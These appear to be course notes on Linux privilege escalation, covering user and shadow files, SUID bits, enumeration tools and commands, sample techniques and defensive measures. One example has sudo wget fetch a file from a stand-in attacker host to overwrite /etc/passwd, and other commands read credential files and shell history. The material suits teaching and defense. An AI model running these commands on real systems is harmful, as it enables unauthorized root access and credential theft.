# O.R. 4.1 - Privilege escalation on Linux: When it's good and when it's a disaster (with examples)

## Overview

- **Privilege Escalation (Privesc)** – elevating access from a limited user to a higher-privileged account (typically **root** on Linux).
- **Legitimate use:** System administrators use `sudo` or `setuid` to perform privileged tasks.
- **Attacker use:** After gaining initial access, attackers enumerate the system to find paths to root.
- **Goal:** Once root is obtained, attackers have full control—data exfiltration, ransomware deployment, service shutdown, etc.

**Types of Privilege Escalation:**

| Type | Description |
|------|-------------|
| **Vertical** | Same user account gains higher privileges (e.g., added to sudoers, exploiting setuid). |
| **Horizontal** | Attacker compromises another user account with higher privileges than the initial one. |

> **Key Insight:** Attackers prefer stealthy methods—kernel exploits are often a **last resort** (noisy, may crash systems).

---

## Linux Privilege Fundamentals

### `/etc/passwd` – User Database

```bash
cat /etc/passwd
```

**Format (colon-separated):**

| Field | Description |
|-------|-------------|
| Username | User login name |
| Password | `x` = encrypted password stored in `/etc/shadow` |
| UID | User ID (0 = root; 1000+ = regular users) |
| GID | Primary Group ID |
| GECOS | Personal info (full name, department, etc.) |
| Home Directory | User's home folder |
| Shell | Path to shell (`/sbin/nologon` = no login) |

**Permissions:**
```
-rw-r--r--  1 root  root  ... /etc/passwd
```
- Owner (root): read+write
- Group (root): read
- All users: read

### `/etc/shadow` – Encrypted Passwords

```bash
cat /etc/shadow
```

**Format:**

| Field | Description |
|-------|-------------|
| Username | User login name |
| Password | Encrypted hash (e.g., `$6$` = SHA-512) |
| Last change | Days since last password change |
| Min age | Minimum days before password change |
| Max age | Maximum days password valid |
| Warn | Days before expiry to warn |
| Inactivity | Days after expiry before lock |
| Expiration | Account expiration date |

**Hash Prefixes:**
| Prefix | Algorithm |
|--------|-----------|
| `$1$` | MD5 |
| `$2a$` | Blowfish |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 |

> **Warning:** If attackers can read `/etc/shadow`, they can crack hashes offline.

### `/etc/group` – Group Memberships

```bash
cat /etc/group
```

**Format:** `groupname:x:GID:user1,user2,...`

### Special Permissions – SUID / SGID / Sticky Bit

| Permission | Symbol | Meaning |
|------------|--------|---------|
| **SUID** | `s` on owner (e.g., `-rwsr-xr-x`) | Executable runs with owner's privileges |
| **SGID** | `s` on group (e.g., `-rwxr-sr-x`) | Executable runs with group's privileges |
| **Sticky Bit** | `t` (e.g., `drwxrwxrwt`) | Only owner can delete/modify file in directory |

**Find SUID/SGID files:**
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

---

## Common Privilege Escalation Vectors

| Vector | Description |
|--------|-------------|
| **Kernel Exploits** | Dirty Cow, Full Nelson – can crash systems; last resort |
| **Application Vulnerabilities** | Unpatched services (e.g., Samba) |
| **Misconfigurations** | World-writable files, weak permissions |
| **Abuse of sudo** | Users with excessive sudo permissions |
| **Abuse of SUID/SGID** | Exploitable binaries with setuid/setgid bits |
| **Cron Jobs** | Scheduled scripts running as root with writable permissions |
| **Weak Passwords** | Credential reuse, plaintext passwords in configs |
| **Unmounted Filesystems** | Sensitive data in unmounted volumes |

---

## Enumeration Tools (Automated)

### LinEnum

- Comprehensive enumeration script.
- Checks: kernel, system info, users, privileged access, environment.

### LinPEAS

- Search for privilege escalation paths on Linux/Unix/macOS.
- Extensive checks; integrated with [HackTricks](https://book.hacktricks.xyz).

### Linux Smart Enumeration (LSE)

- Gradual information disclosure based on importance.
- Designed for CTF and pentesting.

### Linux Exploit Suggester 2

- Suggests kernel exploits based on system version.
- Downloads exploit code directly from Exploit-DB.

---

## Manual Enumeration Commands

| Command | Purpose |
|---------|---------|
| `id` | Show user and group IDs |
| `whoami` | Current username |
| `hostname` | System hostname |
| `uname -a` | Kernel version and system info |
| `ps -ef` | Running processes |
| `echo $PATH` | Environment PATH variable |
| `ifconfig` | Network interfaces |
| `cat /etc/passwd` | List users |
| `sudo -l` | Commands user can run with sudo |
| `find / -perm -u+s -type f 2>/dev/null` | Find SUID binaries |
| `find / -writable -type f 2>/dev/null` | Find world-writable files |
| `history` | Command history (may contain credentials) |

---

## Example Attack Techniques

### 1. Kernel Exploit – Dirty Cow (CVE-2016-5195)

- Race condition in copy-on-write mechanism.
- Allows unprivileged user to overwrite read-only files (e.g., `/etc/passwd`).
- Affects many Linux kernels prior to 2018.

### 2. World-Writable Script Running as Root

- Cron job or script owned by root but world-writable.
- Attacker modifies script to execute reverse shell as root.

### 3. Abusing sudo (`wget` Example)

```bash
# User has sudo permissions for wget
sudo -l
# Output: (root) NOPASSWD: /usr/bin/wget

# Overwrite /etc/passwd with custom content
sudo wget http://attacker.com/passwd -O /etc/passwd

# Gain root access
su root
```

**Resource:** [GTFOBins](https://gtfobins.github.io/) – excellent reference for abusing sudo permissions.

### 4. SUID Misconfiguration – `pkexec`

- Exploitable SUID binaries allow privilege escalation.
- Example: `pkexec` vulnerability (CVE-2021-4034 – PwnKit).

---

## Defensive Strategies

| Strategy | Description |
|----------|-------------|
| **Privileged Access Management (PAM)** | Vault credentials, enforce complex passwords, rotate frequently |
| **Least Privilege** | Users/accounts have just enough access to perform tasks (Zero Standing Privilege) |
| **MFA at Depth** | Multi-factor authentication at login AND privilege elevation points |
| **Patch Management** | Regularly update OS and applications |
| **Audit & Logging** | Monitor privilege usage; set alerts for suspicious activity |
| **Remove Unused Accounts** | Eliminate forgotten or default accounts |
| **Restrict sudo** | Limit sudo permissions; use `NOPASSWD` sparingly |
| **Monitor SUID/SGID** | Regularly audit binaries with special permissions |

---

## Quick Reference

### Useful Resources

| Resource | Purpose |
|----------|---------|
| [GTFOBins](https://gtfobins.github.io/) | Abusing sudo/SUID binaries |
| [HackTricks](https://book.hacktricks.xyz) | Privilege escalation checklists |
| [Exploit-DB](https://www.exploit-db.com) | Public exploits (including kernel) |
| [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) | Kernel exploit suggestions |

### Common Privilege Escalation Commands

```bash
# Find SUID binaries
find / -perm -u+s -type f 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check cron jobs
ls -la /etc/cron*
cat /etc/crontab

# Check for unencrypted passwords in configs
grep -r "password" /var/www/html/ 2>/dev/null

# Check command history
cat ~/.bash_history
```

---

## Key Takeaways

- **Privilege escalation** is the most critical phase after initial compromise—attackers aim for root.
- **Reconnaissance (enumeration)** is essential – attackers gather system info to find weak points.
- **Automated tools** like LinPEAS and LinEnum speed up enumeration but are noisy.
- **Manual enumeration** (`sudo -l`, `find`, `cat /etc/passwd`) is stealthier and often more effective.
- **Common vectors:** SUID/SGID misconfigurations, sudo abuse, world-writable scripts, kernel exploits, weak passwords.
- **Kernel exploits** are a last resort – they can crash systems and alert defenders.
- **GTFOBins** is an invaluable resource for abusing sudo/SUID binaries.
- **Defender focus:** Least privilege, PAM, MFA, patching, and robust logging.
- **Always check `sudo -l`** – excessive sudo permissions are one of the most common privesc paths.